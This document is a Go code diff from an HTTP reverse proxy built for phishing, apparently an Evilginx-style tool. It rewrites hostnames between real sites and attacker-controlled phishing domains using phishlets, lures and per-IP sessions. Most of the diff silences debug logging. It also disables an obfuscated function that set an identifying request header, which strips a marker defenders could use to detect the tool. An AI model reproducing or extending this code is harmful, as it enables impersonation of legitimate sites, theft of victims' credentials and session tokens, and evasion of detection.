 func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
-	log.Warning("replaceHostWithOriginal Awal: %s", hostname)
+	//log.Warning("replaceHostWithOriginal Awal: %s", hostname)
 	if hostname == "" {
 		return hostname, false
 	}
@@ -1899,7 +1899,7 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 		prefix = "."
 		hostname = hostname[1:]
 	}
-	log.Warning("replaceHostWithOriginal AFTER IF: %s", hostname)
+	//log.Warning("replaceHostWithOriginal AFTER IF: %s", hostname)
 	//p.cfg.IsSiteEnabled()
 
 	//parts := strings.Split(hostname, ".")
@@ -1916,23 +1916,23 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 		//}
 		if p.cfg.IsSiteEnabled(site) {
 
-			log.Warning("SITEENABLE CONDITION TRUE")
+			//log.Warning("SITEENABLE CONDITION TRUE")
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-			log.Warning("[replaceHostWithOriginal] phishDomain : %s", phishDomain)
-			log.Warning("[replaceHostWithOriginal] ok : %s", ok)
+// 			log.Warning("[replaceHostWithOriginal] phishDomain : %s", phishDomain)
+// 			log.Warning("[replaceHostWithOriginal] ok : %s", ok)
 			if !ok {
 				continue
 			}
 
 			for _, ph := range pl.proxyHosts {
 
-				log.Warning("[replaceHostWithOriginal] HOSTNAME: %s >> COMBINEHOST: %s", hostname, combineHost(ph.phish_subdomain, phishDomain))
+// 				log.Warning("[replaceHostWithOriginal] HOSTNAME: %s >> COMBINEHOST: %s", hostname, combineHost(ph.phish_subdomain, phishDomain))
 				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-					log.Warning("replaceHostWithOriginal Final: %s", combineHost(ph.orig_subdomain, ph.domain))
+					//log.Warning("replaceHostWithOriginal Final: %s", combineHost(ph.orig_subdomain, ph.domain))
 
 					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
 				} else {
-					log.Warning("replaceHostWithOriginal ELSE: %s", hostname)
+					//log.Warning("replaceHostWithOriginal ELSE: %s", hostname)
 					//if subdomain == "pointb" {
 					//if !adding {
 					//	log.Warning("ADDING PROXY HOST IN replaceHostWithOriginal")
@@ -1977,10 +1977,10 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 				}
 			}
 		} else {
-			log.Warning("SITEENABLE CONDITION FALSE")
+			//log.Warning("SITEENABLE CONDITION FALSE")
 		}
 	}
-	log.Warning("replaceHostWithOriginal Final: %s AND FALSE", hostname)
+	//log.Warning("replaceHostWithOriginal Final: %s AND FALSE", hostname)
 	return hostname, false
 }
 
@@ -2006,17 +2006,17 @@ func checkingSomething(hostname string, pl *Phishlet) bool {
 		}
 
 	}
-	log.Warning("returning true")
+	//log.Warning("returning true")
 	return true
 	//return false
 }
 
 func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
-	log.Warning("replaceHostWithPhished Awal: %s", hostname)
+	//log.Warning("replaceHostWithPhished Awal: %s", hostname)
 
 	//log.Warning(hostname)
 	if hostname == "" {
-		log.Warning("HOSTNAME KOSONG")
+		//log.Warning("HOSTNAME KOSONG")
 		return hostname, false
 	}
 	prefix := ""
@@ -2024,7 +2024,7 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		prefix = "."
 		hostname = hostname[1:]
 	}
-	log.Warning("HOSTNAME replaceHostWithPhished AFTER IF: %s", hostname)
+	//log.Warning("HOSTNAME replaceHostWithPhished AFTER IF: %s", hostname)
 	//addes := false
 	//log.Warning(hostname)
 
@@ -2032,7 +2032,7 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-			log.Warning("PHISHDOMAIN %s", phishDomain)
+			//log.Warning("PHISHDOMAIN %s", phishDomain)
 			if !ok {
 				log.Warning("NOT OKK")
 				continue
@@ -2052,9 +2052,9 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 					}
 					parts := strings.Split(strings.ToLower(hostname), ".")
 					domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-					log.Warning("domain inside replaceHostWithPhished: %s", domain)
+					//log.Warning("domain inside replaceHostWithPhished: %s", domain)
 					subdomain := parts[len(parts)-3]
-					log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
+					//log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
 					data := ProxyHost{
 						phish_subdomain: subdomain,
 						domain:          domain,
@@ -2134,17 +2134,17 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 
 			for _, ph := range pl.proxyHosts {
 
-				log.Warning("HOSTNAME: %s Domain %s", hostname, ph.domain)
+				//log.Warning("HOSTNAME: %s Domain %s", hostname, ph.domain)
 				if hostname == ph.domain {
-					log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
-					log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
+					//log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
+					//log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
 					return prefix + phishDomain, true
 				}
-				log.Warning("[IF] HOSTNAME: %s CombineHost %s", hostname, combineHost(ph.orig_subdomain, ph.domain))
+				//log.Warning("[IF] HOSTNAME: %s CombineHost %s", hostname, combineHost(ph.orig_subdomain, ph.domain))
 				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-					log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
+					//log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
 					//log.Warning(combineHost(ph.phish_subdomain, phishDomain))
-					log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
+					//log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
 					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
 				}
 
@@ -2153,12 +2153,12 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		}
 
 	}
-	log.Warning("replaceHostWithPhished: %s AND condition : %b", hostname, false)
+	//log.Warning("replaceHostWithPhished: %s AND condition : %b", hostname, false)
 	return hostname, false
 }
 
 func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
-	log.Warning("Inside getPhishDomain AWAL , hostname : %s", hostname)
+	//log.Warning("Inside getPhishDomain AWAL , hostname : %s", hostname)
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
@@ -2167,7 +2167,7 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 			}
 			for _, ph := range pl.proxyHosts {
 				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-					log.Important("getPhishDomain: %s AND TRUE ", phishDomain)
+					//log.Important("getPhishDomain: %s AND TRUE ", phishDomain)
 					return phishDomain, true
 				}
 			}
@@ -2258,7 +2258,7 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 }
 
 func (p *HttpProxy) Start() error {
-	log.Important("HTTPPROXY START")
+	//log.Important("HTTPPROXY START")
 	go p.httpsWorker()
 	return nil
 }
@@ -2301,14 +2301,14 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
 	return sid, ok
 }
 
-func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
-	var b []byte = []byte("\x1dh\x003,)\",+=")
-	for n, c := range b {
-		b[n] = c ^ 0x45
-	}
-	log.Warning("cantFindMe: %s %s", req.RemoteAddr, nothing_to_see_here)
-	req.Header.Set(string(b), nothing_to_see_here)
-}
+// func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
+// 	var b []byte = []byte("\x1dh\x003,)\",+=")
+// 	for n, c := range b {
+// 		b[n] = c ^ 0x45
+// 	}
+// 	//log.Warning("cantFindMe: %s %s", req.RemoteAddr, nothing_to_see_here)
+// 	req.Header.Set(string(b), nothing_to_see_here)
+// }
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
 	if enabled {
